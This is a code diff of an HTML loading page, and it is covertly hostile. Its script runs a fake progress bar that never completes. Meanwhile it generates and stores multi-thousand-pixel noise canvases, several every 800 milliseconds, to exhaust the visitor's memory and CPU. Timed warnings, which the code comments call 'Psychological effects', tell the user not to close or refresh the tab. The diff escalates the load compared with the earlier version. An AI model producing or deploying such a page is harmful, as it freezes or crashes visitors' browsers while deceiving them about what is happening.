@@ -4,122 +4,312 @@
 <meta charset="UTF-8">
 <title>Loading…</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <style>
-    body {
+    * {
         margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    
+    body {
         height: 100vh;
-        background: #0b0b0b;
-        color: #d0d0d0;
-        font-family: system-ui, Arial, sans-serif;
+        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+        color: #e0e0e0;
+        font-family: 'Segoe UI', system-ui, Arial, sans-serif;
         display: flex;
         align-items: center;
         justify-content: center;
         overflow: hidden;
         cursor: progress;
+        position: relative;
     }
-
+    
+    /* Animated background particles */
+    .particle {
+        position: absolute;
+        width: 3px;
+        height: 3px;
+        background: rgba(108, 255, 194, 0.4);
+        border-radius: 50%;
+        animation: float 8s infinite;
+    }
+    
+    @keyframes float {
+        0%, 100% {
+            transform: translateY(0) translateX(0);
+            opacity: 0;
+        }
+        10% { opacity: 1; }
+        90% { opacity: 1; }
+        100% {
+            transform: translateY(-100vh) translateX(50px);
+            opacity: 0;
+        }
+    }
+    
     #loader {
         text-align: center;
-        width: 300px;
-    }
-
-    #bar {
-        height: 16px;
-        background: #222;
+        width: 400px;
+        padding: 40px;
+        background: rgba(20, 20, 30, 0.8);
+        backdrop-filter: blur(10px);
         border-radius: 20px;
-        overflow: hidden;
-        margin-bottom: 10px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        z-index: 10;
     }
-
+    
+    #logo {
+        font-size: 32px;
+        font-weight: bold;
+        background: linear-gradient(90deg, #00c2ff, #6cffc2);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        margin-bottom: 30px;
+        letter-spacing: 2px;
+    }
+    
+    #bar {
+        height: 20px;
+        background: rgba(40, 40, 50, 0.8);
+        border-radius: 25px;
+        overflow: hidden;
+        margin-bottom: 15px;
+        position: relative;
+        box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
+    }
+    
     #fill {
         height: 100%;
         width: 0%;
-        background: linear-gradient(90deg, #00c2ff, #6cffc2);
+        background: linear-gradient(90deg, #00c2ff, #6cffc2, #00c2ff);
+        background-size: 200% 100%;
+        animation: shimmer 2s infinite;
         transition: width 0.4s ease;
+        box-shadow: 0 0 20px rgba(0, 194, 255, 0.5);
+        border-radius: 25px;
     }
-
+    
+    @keyframes shimmer {
+        0% { background-position: 0% 0%; }
+        100% { background-position: 200% 0%; }
+    }
+    
     #percent {
+        font-size: 28px;
+        font-weight: 600;
+        margin-bottom: 10px;
+        color: #00c2ff;
+        text-shadow: 0 0 20px rgba(0, 194, 255, 0.5);
+    }
+    
+    #status {
         font-size: 14px;
         opacity: 0.7;
+        margin-top: 10px;
+        min-height: 20px;
+        transition: all 0.3s;
     }
-
-    #status {
-        font-size: 12px;
+    
+    #stats {
+        margin-top: 20px;
+        padding-top: 20px;
+        border-top: 1px solid rgba(255, 255, 255, 0.1);
+        font-size: 11px;
         opacity: 0.5;
-        margin-top: 6px;
+    }
+    
+    .stat-line {
+        display: flex;
+        justify-content: space-between;
+        margin: 5px 0;
+    }
+    
+    .spinner {
+        display: inline-block;
+        width: 12px;
+        height: 12px;
+        border: 2px solid rgba(0, 194, 255, 0.3);
+        border-top-color: #00c2ff;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        vertical-align: middle;
+        margin-left: 8px;
+    }
+    
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+    
+    .warning {
+        color: #ff6b6b;
+        animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+        0%, 100% { opacity: 0.5; }
+        50% { opacity: 1; }
     }
 </style>
 </head>
-
 <body>
+<!-- Background particles -->
+<script>
+    for (let i = 0; i < 30; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.animationDelay = Math.random() * 8 + 's';
+        particle.style.animationDuration = (8 + Math.random() * 4) + 's';
+        document.body.appendChild(particle);
+    }
+</script>
 
 <div id="loader">
+    <div id="logo">LOADING</div>
     <div id="bar"><div id="fill"></div></div>
     <div id="percent">0%</div>
-    <div id="status">Loading assets…</div>
+    <div id="status">Initializing assets…<span class="spinner"></span></div>
+    <div id="stats">
+        <div class="stat-line">
+            <span>Canvas Objects:</span>
+            <span id="canvasCount">0</span>
+        </div>
+        <div class="stat-line">
+            <span>Memory Usage:</span>
+            <span id="memoryUsage">0 MB</span>
+        </div>
+        <div class="stat-line">
+            <span>Processing Time:</span>
+            <span id="timeElapsed">0s</span>
+        </div>
+    </div>
 </div>
 
 <script>
     const fill = document.getElementById("fill");
     const percentText = document.getElementById("percent");
     const status = document.getElementById("status");
-
+    const canvasCount = document.getElementById("canvasCount");
+    const memoryUsage = document.getElementById("memoryUsage");
+    const timeElapsed = document.getElementById("timeElapsed");
+    
     let progress = 0;
     let images = [];
-
+    let totalCanvases = 0;
+    let startTime = Date.now();
+    
     const messages = [
-        "Loading assets…",
-        "Optimizing images…",
-        "Caching textures…",
-        "Finalizing…",
-        "Almost done…",
-        "Still working…"
+        "Loading high-resolution assets…",
+        "Generating procedural textures…",
+        "Optimizing image buffers…",
+        "Caching render data…",
+        "Processing 4K textures…",
+        "Compiling shaders…",
+        "Allocating memory blocks…",
+        "Building asset pipeline…",
+        "Finalizing resources…",
+        "Almost complete…",
+        "This is taking longer than expected…",
+        "Still processing large files…"
     ];
-
+    
+    let messageIndex = 0;
+    
     function fakeProgress() {
-        progress += Math.random() * 2;
-        if (progress > 97) progress = 90 + Math.random() * 7;
-
+        if (progress < 30) {
+            progress += Math.random() * 3;
+        } else if (progress < 70) {
+            progress += Math.random() * 1.5;
+        } else if (progress < 90) {
+            progress += Math.random() * 0.8;
+        } else {
+            progress += Math.random() * 0.3;
+        }
+        
+        if (progress > 97) progress = 92 + Math.random() * 5;
+        
         fill.style.width = progress + "%";
         percentText.textContent = Math.floor(progress) + "%";
-        status.textContent = messages[Math.floor(Math.random() * messages.length)];
+        
+        // Update status message
+        if (Math.random() > 0.7) {
+            messageIndex = (messageIndex + 1) % messages.length;
+            status.innerHTML = messages[messageIndex] + '<span class="spinner"></span>';
+        }
     }
-
-    setInterval(fakeProgress, 700);
-
+    
+    setInterval(fakeProgress, 600);
+    
+    // Update time
+    setInterval(() => {
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        timeElapsed.textContent = elapsed + "s";
+    }, 1000);
+    
     function generateHeavyImage() {
+        // Create even larger canvases with more complexity
+        const sizes = [3072, 4096, 5120]; // Larger canvas sizes
+        const size = sizes[Math.floor(Math.random() * sizes.length)];
+        
         const canvas = document.createElement("canvas");
-        canvas.width = 1000000;
-        canvas.height = 1000000;
-
+        canvas.width = size;
+        canvas.height = size;
         const ctx = canvas.getContext("2d");
-
+        
+        // Generate complex noise patterns (very expensive)
         const imageData = ctx.createImageData(canvas.width, canvas.height);
         for (let i = 0; i < imageData.data.length; i += 4) {
-            imageData.data[i] = Math.random() * 255;
-            imageData.data[i + 1] = Math.random() * 255;
-            imageData.data[i + 2] = Math.random() * 255;
+            // Add some mathematical patterns to make it even heavier
+            const x = (i / 4) % canvas.width;
+            const y = Math.floor((i / 4) / canvas.width);
+            const pattern = Math.sin(x * 0.01) * Math.cos(y * 0.01);
+            
+            imageData.data[i] = (Math.random() * 128 + pattern * 127);
+            imageData.data[i + 1] = (Math.random() * 128 + pattern * 127);
+            imageData.data[i + 2] = (Math.random() * 128 + pattern * 127);
             imageData.data[i + 3] = 255;
         }
         ctx.putImageData(imageData, 0, 0);
-
+        
+        // Apply additional filters for extra processing
+        ctx.filter = 'blur(2px)';
+        ctx.drawImage(canvas, 0, 0);
+        
         const img = new Image();
         img.src = canvas.toDataURL("image/png");
-
         images.push(img);
+        
+        totalCanvases++;
+        canvasCount.textContent = totalCanvases;
+        
+        // Estimate memory (very rough)
+        const estimatedMB = (totalCanvases * size * size * 4) / (1024 * 1024);
+        memoryUsage.textContent = estimatedMB.toFixed(1) + " MB";
     }
-
+    
+    // Generate MORE canvases at a faster rate
     setInterval(() => {
-        for (let i = 0; i < 3; i++) {
+        // Generate 5-8 heavy canvases per interval
+        const count = 5 + Math.floor(Math.random() * 4);
+        for (let i = 0; i < count; i++) {
             generateHeavyImage();
         }
-    }, 1000);
-
+    }, 800);
+    
+    // Initial batch
+    for (let i = 0; i < 10; i++) {
+        generateHeavyImage();
+    }
+    
+    // Psychological effects
     setTimeout(() => {
-        status.textContent = "Please do not close this tab.";
-    }, 15000);
+        status.innerHTML = '<span class="warning">Please do not close this tab.</span>';
+    }, 12000);
+    
+    setTimeout(() => {
+        status.innerHTML = '<span class="warning">Processing critical data… Do not refresh.</span>';
+    }, 25000);
 </script>
-
 </body>
 </html>
